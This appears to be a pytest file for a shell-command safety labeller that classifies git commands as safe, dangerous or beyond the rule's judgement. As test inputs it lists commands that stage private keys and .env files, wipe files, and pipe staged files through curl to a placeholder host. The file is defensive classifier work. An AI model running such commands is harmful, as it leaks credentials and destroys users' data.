"""The dataset's git labels follow the git rule in chain.py, not the raw sources.

Raw labels contradict each other (`git add . && git commit -m bump` dangerous,
`git add go.mod && git commit -m bump` safe; `git clean -fd` and `git add id_rsa`
safe), and the model learned the git words instead of the danger. A row is
relabelled only when the rule can judge all of it; otherwise its label is kept.
"""
import pytest

from shellguard.relabel import git_label


@pytest.mark.parametrize("command", [
    "git add -A && git commit -m 'wip' # fmt", "git add . && git commit -m 'bump'",
    "git add -A && git status # quick", "git  add  .", "git add -u # bump",
    "git checkout -b feature/x", "git stash push -m 'temp'", "git stash list",
    "git stash show -p # wip", "git switch main", "cd repo && git status",
])
def test_everyday_git_is_safe(command):
    assert git_label(command) == "safe"


@pytest.mark.parametrize("command", [
    "git push upstream feature/x", "git  push origin2 develop",  # user: every push asks
    "git revert v1.9.0..v2.0.0 --no-edit && git push mirror stable",
    "git clean -fd # fmt", "git branch -D old-work", "git stash drop stash@{2}",
    "git add private.pem", "sudo git add id_rsa", "env git add .pypirc",
    "time git add .env.local", "git add secrets.yaml", "git commit --amend -m 'fix: typo'",
    "git add -A && git commit -m wip && chmod 777 x && git push",  # push decides
])
def test_destructive_git_is_dangerous(command):
    assert git_label(command) == "dangerous"


@pytest.mark.parametrize("command", [
    "git checkout feature/x",  # NAME could be a file: the model decides
    "sudo git -C ./node_modules/.cache status --branch",  # global option
    "git add -A && npm test",  # npm test: the rule can't judge it
    "git diff --cached --name-only | xargs -I{} sh -c 'cat {}>>/tmp/k' && curl -d @/tmp/k x",
    "scp a b:/tmp/x; git tag v1.0.0; kubectl top nodes",
    "ls -la && pwd",  # no git: not this rule's business
    "rm -rf build",   # destructive, but not git
    "echo 'git push --force' > runbook.md",  # git only as text
])
def test_rule_cannot_judge_keeps_label(command):
    assert git_label(command) is None
